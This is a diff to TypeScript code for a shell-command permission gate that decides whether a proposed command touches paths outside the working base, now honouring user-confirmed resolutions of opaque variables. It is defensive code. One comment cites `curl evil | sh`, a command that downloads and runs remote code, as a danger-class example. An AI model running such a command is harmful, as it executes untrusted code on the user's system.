@@ -54,7 +54,7 @@ import type { PromptData } from "./decision-engine";
 import type { Store } from "./store";
 import { analyzeCommand } from "./analysis/command-analysis";
 import { resolveOpaqueRefs } from "./analysis/var-resolution";
-import { expandTilde } from "./analysis/path-util";
+import { expandTilde, shortenToken } from "./analysis/path-util";
 import { resolvePathReal, isInsideCwd, isAllowedReadPath, isAllowedWritePath, isProjectPiPathResolved } from "./analysis/path-analysis";
 import { isTrustedScriptPath } from "./config/trusted-scripts";
 import { UNKNOWN_CWD_MARKER, cdBaseBounds, OUT_REDIRECT_RE, IN_REDIRECT_RE, BARE_REDIRECT_RE } from "./analysis/cwd-tracking";
@@ -82,6 +82,10 @@ export type DspaGateResult =
        *  untrusted packages; not for danger-class stops (a verdict on
        *  `curl evil | sh` is noise). */
       advisory?: boolean;
+      /** Confirmed (user-accepted) token → dirs resolutions that fell
+       *  outside the base — the fall-through prompt offers a grant for
+       *  EXACTLY these dirs (deterministic; no LLM call needed). */
+      confirmedOutside?: Array<{ token: string; dirs: string[] }>;
     };
 
 /**
@@ -197,21 +201,56 @@ function networkHit(command: string, segments: string[]): string | null {
  * unresolvable cd made the base unbounded — both let outside-base reads
  * pass the floor.
  */
+/**
+ * The manual bar (Q1 floor): a path is inside it when manual mode would
+ * not prompt for it — under the cwd, in a session-granted dir, config-
+ * allowed, or a trusted script. Shared by the gate (scope checks) and the
+ * prompt flow (deciding which one-shot-"Yes" resolutions are safe to
+ * confirm — all-in-bar dirs never needed a grant, so confirming them only
+ * makes the next run deterministic).
+ */
+export function makeManualBar(store: Store, cwd: string): (p: string) => boolean {
+  return (p: string) =>
+    isInsideCwd(p, cwd) ||
+    store.isInsideAllowedDir(p, "read") ||
+    isAllowedReadPath(p) ||
+    isAllowedWritePath(p) ||
+    isTrustedScriptPath(p);
+}
+
 type D7Resolution =
   | { kind: "inside" } // every candidate base keeps it in-base
-  | { kind: "outside"; paths: string[] } // concrete outside-base locations
+  | { kind: "outside"; paths: string[]; confirmedToken?: string } // concrete outside-base locations
   | { kind: "stop"; reason: string }; // unprovable location — Q1 floor stop
 
-/** Resolve one sentinel outside path (see D7 above). */
+/**
+ * Resolve one sentinel outside path (see D7 above).
+ *
+ * `confirmed` is the user-accepted resolution for an opaque-var token
+ * (store.getConfirmedResolution — set when the user took an option that
+ * granted the LLM-suggested dirs for it). A confirmed sentinel is judged
+ * like a concrete location: every confirmed dir inside the base → in-base
+ * (judgeable); any dir outside → an outside stop naming exactly those dirs
+ * (the prompt offers a grant for them, so the next identical run passes —
+ * steady state without an LLM). Unconfirmed → the Q1 floor stop.
+ */
 function d7ResolveSentinel(
   p: string,
   cwd: string,
   isInsideBase: (p: string) => boolean,
   bounds: { unbounded: boolean; candidates: string[] },
+  opaque: { token: string | null; confirmed: string[] | null },
 ): D7Resolution {
   if (p.startsWith(OPAQUE_VAR_DIR)) {
-    const token = p.slice(OPAQUE_VAR_DIR.length + 1).replace(/^\//, "");
-    return { kind: "stop", reason: `runtime location unresolvable (${token})` };
+    const token =
+      opaque.token ?? p.slice(OPAQUE_VAR_DIR.length + 1).replace(/^\//, "");
+    if (opaque.confirmed) {
+      const outside = opaque.confirmed.filter((d) => !isInsideBase(d));
+      return outside.length > 0
+        ? { kind: "outside", paths: outside, confirmedToken: token }
+        : { kind: "inside" };
+    }
+    return { kind: "stop", reason: `runtime location unresolvable (${shortenToken(token)})` };
   }
   if (p.startsWith(UNKNOWN_CWD_MARKER)) {
     if (bounds.unbounded) {
@@ -269,6 +308,7 @@ export async function checkDspaGate(
     pd.analysis ??
     (await analyzeCommand(pd.command, pd.cwd, {
       isInsideAllowedDir: (p) => store.isInsideAllowedDir(p, "read"),
+      getConfirmedResolution: (t) => store.getConfirmedResolution(t),
     }));
   if (analysis.hasParseError) return { ok: false, reason: "unparseable command" };
 
@@ -278,12 +318,7 @@ export async function checkDspaGate(
   // config-allowed paths + trusted scripts. A location manual mode
   // auto-allows is not a scope violation — the judge reviews it; only what
   // manual would prompt for (outside base) stops here (Q1, re-confirmed).
-  const isInsideManualBar = (p: string) =>
-    isInsideCwd(p, pd.cwd) ||
-    store.isInsideAllowedDir(p, "read") ||
-    isAllowedReadPath(p) ||
-    isAllowedWritePath(p) ||
-    isTrustedScriptPath(p);
+  const isInsideManualBar = makeManualBar(store, pd.cwd);
 
   let outsideExempt = new Set<string>();
   const hasRm = analysis.segments.some(isRmSegment);
@@ -356,14 +391,41 @@ export async function checkDspaGate(
   // locations stop outright (Q1 — never judgeable).
   const bounds = cdBaseBounds(analysis.parsedSegments, pd.cwd);
   const resolvedOutside: string[] = [];
+  const confirmedOutside: Array<{ token: string; dirs: string[] }> = [];
+  // Each unbound opaque ref contributes TWO entries: the raw reference text
+  // (e.g. /base/$e/f) and its marker twin (<unresolved-var>/base/$e/f —
+  // never inside the bar). The marker is the location authority for the ref:
+  // a confirmed resolution judges the real dirs; without one, the floor
+  // stops. The raw text alone stops nothing — it is a shell token, not a
+  // filesystem location (its value can be anything). marker → token comes
+  // from the analysis's own unresolved list (the marker string alone is
+  // ambiguous for absolute tokens — path.join dropped their leading slash).
+  const tokenByMarker = new Map<string, string>();
+  const markerByToken = new Map<string, string>();
+  for (const u of analysis.prompt.unresolved) {
+    tokenByMarker.set(u.marker, u.token);
+    markerByToken.set(u.token, u.marker);
+  }
+  const markersInOutside = new Set(
+    outside.filter((p) => p.startsWith(OPAQUE_VAR_DIR)),
+  );
   for (const p of outside) {
     if (!p.startsWith(OPAQUE_VAR_DIR) && !p.startsWith(UNKNOWN_CWD_MARKER)) {
+      // Its marker twin is in the outside set → the sentinel pass handles
+      // this ref (confirmed dirs judge it; unconfirmed stops it).
+      if (markersInOutside.has(markerByToken.get(p) ?? "")) continue;
       resolvedOutside.push(p);
       continue;
     }
-    const r = d7ResolveSentinel(p, pd.cwd, isInsideManualBar, bounds);
-    if (r.kind === "outside") resolvedOutside.push(...r.paths);
-    else if (r.kind === "stop") return { ok: false, reason: r.reason, advisory: true };
+    const token = p.startsWith(OPAQUE_VAR_DIR) ? tokenByMarker.get(p) ?? null : null;
+    const r = d7ResolveSentinel(p, pd.cwd, isInsideManualBar, bounds, {
+      token,
+      confirmed: token ? store.getConfirmedResolution(token) : null,
+    });
+    if (r.kind === "outside") {
+      resolvedOutside.push(...r.paths);
+      if (r.confirmedToken) confirmedOutside.push({ token: r.confirmedToken, dirs: r.paths });
+    } else if (r.kind === "stop") return { ok: false, reason: r.reason, advisory: true };
     // inside → drop
   }
   // Opaque refs re-resolved under the floor's (manual) bar — defensive twin
@@ -378,9 +440,28 @@ export async function checkDspaGate(
     isInsideManualBar,
   );
   resolvedOutside.push(...floor.paths);
+  // D12 confirmed resolutions: the analysis layer already made a confirmed
+  // sentinel concrete (its outside dirs are in resolvedOutside above, or it
+  // dropped out entirely when all in-bar). Surface any confirmed token whose
+  // dirs fall outside the bar so the prompt labels them `confirmed` and the
+  // paths grant covers them — the same bar (isInsideManualBar) the analysis
+  // used, so this agrees with what the floor just resolved.
+  for (const u of analysis.prompt.unresolved) {
+    const confirmed = store.getConfirmedResolution(u.token);
+    if (!confirmed) continue;
+    const out = confirmed.filter((d) => !isInsideManualBar(d));
+    if (out.length > 0 && !confirmedOutside.some((c) => c.token === u.token)) {
+      confirmedOutside.push({ token: u.token, dirs: out });
+    }
+  }
   if (resolvedOutside.length > 0) {
     const shown = [...new Set(resolvedOutside)].slice(0, 2);
-    return { ok: false, reason: `touches paths outside base (${shown.join(", ")})`, advisory: true };
+    return {
+      ok: false,
+      reason: `touches paths outside base (${shown.join(", ")})`,
+      advisory: true,
+      ...(confirmedOutside.length > 0 ? { confirmedOutside } : {}),
+    };
   }
   return { ok: true };
 }
